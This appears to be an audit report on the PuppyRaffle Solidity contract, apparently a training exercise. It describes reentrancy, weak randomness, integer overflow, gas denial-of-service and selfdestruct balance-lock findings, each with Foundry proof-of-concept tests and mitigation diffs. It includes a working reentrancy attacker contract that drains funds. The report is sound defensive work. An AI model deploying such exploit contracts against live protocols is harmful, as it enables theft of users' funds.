[H-1] Reentrancy Vulnerability in `PuppyRaffle::refund` function

Description: The `PuppyRaffle::refund` function is vulnerable to a reentrancy attack. This occurs because the contract transfers funds to the player (via sendValue) before updating the player's status in the players array. Specifically, the player's address is only set to address(0) after the transfer, allowing a malicious contract to repeatedly call `PuppyRaffle::refund` within a fallback or receive function before the player's state is updated. This can drain the contract's balance as the attacker keeps receiving refunds in an infinite loop.

Impact: The attacker can exploit this reentrancy vulnerability to repeatedly invoke the `PuppyRaffle::refund` function, draining all funds in the contract. This could result in a complete loss of funds from the `PuppyRaffle` contract.

Proof of Concept:
1. Deploy the `PuppyRaffle::AttackerContract` 

```javascript
contract AttackerContract {
    PuppyRaffle puppyRaffle;
    uint256 attackerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }

    function attack() public payable {
        address;
        players[0] = address(this);
        puppyRaffle.enterRaffle{ value: puppyRaffle.entranceFee() }(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));

        // Trigger the refund, initiating the attack
        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance > 0) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}
```

2. Run the following test case:

<details>
<summary>Code</summary>

```javascript
function testRefundReentrancy() public playersEntered {
    uint256 balanceOfRaffleBeforeAttack = address(puppyRaffle).balance;

    vm.prank(address(attackerContract));
    vm.deal(address(attackerContract), INITIAL_ATTACKER_BALANCE);
    attackerContract.attack{ value: entranceFee }();

    uint256 balanceOfRaffleAfterAttack = address(puppyRaffle).balance;
    uint256 balanceOfAttackerAfterAttack = address(attackerContract).balance;

    assertEq(balanceOfRaffleAfterAttack, 0);
    assertEq(balanceOfAttackerAfterAttack, INITIAL_ATTACKER_BALANCE + balanceOfRaffleBeforeAttack);
}
```

</details>

Recommended Mitigation:

1. Follow the Checks-Effects-Interactions (CEI) pattern: Update the player's state (i.e., setting players[playerIndex] = address(0)) before interacting with external contracts or sending funds. This ensures that the player's state is updated before any external interaction can trigger reentrancy.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
        // calls payable(msg.sender).call{ value: entranceFee }(""); which sends the entranceFee to the player
-       payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
+       payable(msg.sender).sendValue(entranceFee);

        emit RaffleRefunded(playerAddress);
    }
```

2. Use OpenZeppelin's ReentrancyGuard: Apply the nonReentrant modifier from the ReentrancyGuard contract to prevent reentrancy at the function level.

```diff
+    function refund(uint256 playerIndex) public nonReentrant {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        players[playerIndex] = address(0);
        // calls payable(msg.sender).call{ value: entranceFee }(""); which sends the entranceFee to the player

        payable(msg.sender).sendValue(entranceFee);

        emit RaffleRefunded(playerAddress);
    }
```

[H-2] Insecure Randomness in `PuppyRaffle::selectWinner` function

Description: The `PuppyRaffle::selectWinner` function uses `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))` to generate a random winner index. However, these sources of randomness (e.g., `block.timestamp` and `block.difficulty`) are not secure because they can be manipulated by miners, who can influence the outcome of the random number to their benefit. Specifically, a miner could adjust the timestamp or difficulty of the block to change the result of the winner selection, resulting in biased or predictable outcomes.

Impact: An attacker, particularly a miner or someone colluding with a miner, could influence the result of the `PuppyRaffle::selectWinner` function, manipulating the randomness to their advantage and choosing a specific winner. This makes the entire raffle process unfair and unreliable, compromising the integrity of the system.

Proof of Concept: Add the following test in your `PuppyRaffle.t.sol` in order to see how changing the `block.timestamp` reflects onto the "randomly" generated number.

```javascript
    function testRandomnessManipulation() public playersEntered {
        uint256 playersCount = puppyRaffle.getPlayersCount();
        uint256 expectedWinnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % playersCount;

        // Change the block timestamp to a known value
        vm.warp(block.timestamp + 10);
        uint256 manipulatedWinnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % playersCount;

        assert(expectedWinnerIndex != manipulatedWinnerIndex);
    }
```

Recommended Mitigation: Consider using solution such as `Chainlink VRF` in order to get provably random number. Using random numbers on chain is well known attack vector.


[H-3] Arithmetic Overflow and Unsafe Cast in `PuppyRaffle::selectWinner` which can lead to inability to withdraw fees

Description: In the `PuppyRaffle::selectWinner` function, the contract calculates a fee by taking 20% of the total amount collected. However, the fee (which is a `uint256`) is cast to a `uint64` when added to `PuppyRaffle::totalFees`. This introduces two issues:

1. Arithmetic Overflow: When adding large values of fee to totalFees, there's a risk of overflow if the resulting value exceeds the maximum limit of `uint64` (which is `2^64 - 1` or `18,446,744,073,709,551,615`). Since fee is calculated as a percentage of `totalAmountCollected` (in `uint256`), any large `totalAmountCollected` will result in large fee values that could overflow during the addition.

2. Truncation Risk: Casting fee from `uint256` to `uint64` can cause truncation, meaning that values greater than the maximum value for a `uint64` will be cut off. As a result, only the lower 64 bits will be preserved, leading to a potential loss of precision or incorrect values being assigned to totalFees.

Impact: If a large fee value is cast to `uint64`, it may lead to either overflow or truncation. This could result in:
an incorrect accumulation of fees (which may be significantly lower than expected), which makes impossible for `PuppyRaffle::feeAddress` to call
the `PuppyRaffle::withdrawFees` function since this require - `require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");` 

Proof of Concept: Add the following test case inside `PuppyRaffle.t.sol` that shows off the overflow if a lot of players enter the raffle so the `PuppyRaffle::withdrawFees` reverts.

<details>
<summary>Code</summary>

```javascript
    function testSelectWinnerOverflow() public playersEntered {
        // Warp to the end of the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // Select the winner
        puppyRaffle.selectWinner();

        // 4 players initally, let's check the totalFees -> 800000000000000000 ~ 0.8 ether
        uint256 initiallyTotalFees = puppyRaffle.totalFees();

        // Populate more players players so the totalFees overflows
        uint64 maxUint64 = type(uint64).max; // 18,446,744,073,709,551,615 ~ 18e18
        uint256 numPlayers = 89;
        address[] memory players = new address[](numPlayers);

        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(uint160(i + 1));
        }

        puppyRaffle.enterRaffle{value: players.length * entranceFee }(players);

        // Warp to the end of the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // Select the winner
        puppyRaffle.selectWinner();

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();

        // With 93 players, the totalFees overflows to this number 153255926290448384 which is the difference between actual totalFees and maxUint64, which is not proper
        uint256 endTotalFees = puppyRaffle.totalFees(); // 0.153.255.926.290.448.384

        // Shows off the overflow
        assert(endTotalFees < initiallyTotalFees);
    }
```

</details>

Recommended Mitigation: The older versions of solidity (below `0.8.0`) doesn't check for overflow and underflow by default. So recommended mitigations would be:

1. Avoid Casting from `uint256` to `uint64`: Use `uint256` for storing the totalFees to avoid truncation or overflow issues.
2. Consider using `SafeMath` to ensure that any overflow will trigger a revert.



[M-1] Increasing Gas Costs Due to Looping Over a Growing Array (Denial of Service Vulnerability)

Description: The ```PuppyRaffle::enterRaffle``` function includes two nested loops that iterate over the players array to check for duplicate entries. As more players are added to the raffle, the size of the players array grows, leading to increasingly expensive operations in terms of gas consumption. This is because the complexity of the nested loops is O(n^2), where n is the number of players. The larger the array, the more gas is required to complete the transaction.

Impact: This issue presents a Denial of Service (DoS) vulnerability. As the raffle grows and more players are added, the gas required to participate in the raffle increases significantly. At a certain point, the gas required may exceed the block gas limit, preventing any further players from entering the raffle. This would effectively halt the raffle, denying service to users who want to participate and potentially trapping funds within the contract.

Proof of Concept: The following test case demonstrates how the gas cost of calling ```PuppyRaffle::enterRaffle``` increases as more players are added:

<details>
<summary>Code</summary>

```javascript
    function testEnterRaffleBecomesMoreAndMoreExpensive() public {
        uint256 numberOfPlayers = 10;
        address[] memory players = new address[](numberOfPlayers);

        for (uint256 i = 0; i < numberOfPlayers; i++) {
            players[i] = address(uint160(i + 1));
        }

        uint256 gasStart = gasleft();

        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

        // 306.189 gas used for 10 players
        uint256 gasUsedInitial = gasStart - gasleft();

        address[] memory morePlayers = new address[](numberOfPlayers);

        for (uint256 i = 0; i < numberOfPlayers; i++) {
            morePlayers[i] = address(uint160(i + numberOfPlayers + 1));
        }

        uint256 gasAfter = gasleft();

        puppyRaffle.enterRaffle{ value: entranceFee * morePlayers.length }(morePlayers);

        // 395.088 gas used for 10 more players
        uint256 gasAfterUsed = gasAfter - gasleft();

        assert(gasAfterUsed > gasUsedInitial);
    }
```

</details>

Recommended Mitigation: There a few recommendations

1. Consider removing check for duplicates. We are doing the check by wallet address, anyway users can create multiple wallets in order to participate into the raffle.
2. If you want to keep the functionallity, consider using a mapping in order to check for duplicates instead of looping through the players array each time. 

```diff
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
+            require(!activePlayers[newPlayers[i]], "PuppyRaffle: Duplicate player");
            players.push(newPlayers[i]);
+            activePlayers[newPlayers[i]] = true;
        }

        // Check for duplicates
        // @audit - DOS(Denial Of Service) Attack vector
-        for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }

        emit RaffleEnter(newPlayers);
    }
```

[M-2] Improper Handling of ETH in `PuppyRaffle::withdrawFees`

Description: The `PuppyRaffle::withdrawFees` function contains a vulnerability that stems from the strict equality check between the contract’s balance and `totalFees`. The line `require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");` is prone to abuse. A malicious contract can call `selfdestruct()` to send arbitrary Ether to the `PuppyRaffle` contract. This disrupts the check because `address(this).balance` can become larger than `totalFees`, which would cause the condition to fail, effectively locking the `PuppyRaffle::withdrawFees` function and preventing anyone from withdrawing the contract’s fees.

Impact: 

Loss of Funds - If this `selfdestruct` is successful, the fees accrued in the contract may become inaccessible, resulting in a permanent loss of those funds for the contract owner.

Proof of Concept: Add the following test case in `PuppyRaffleTest.t.sol`, which demostrates the mishandling of eth inside `PuppyRaffle::withdrawFees` function

<details>
<summary>Code</summary>

```javascript
    function testWidthdrawFessMisshapen() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        SelfDestruct selfDestruct = new SelfDestruct(address(puppyRaffle));
        // Attack function destructs the `SelfDesctruct` contract and sends entrance fee to the puppyRaffle, which leads to a misshapen balance
        selfDestruct.attack{ value: entranceFee }();

        vm.prank(feeAddress);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```
</details>

Recommended Mitigation: The simpliest recommended mitigation would be instead of a strict equality check, ensure that the contract balance is at least equal to the `totalFees`. This prevents a malicious party from locking the funds by sending extra Ether:

```diff
    function withdrawFees() external {
-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+       require(address(this).balance >= uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```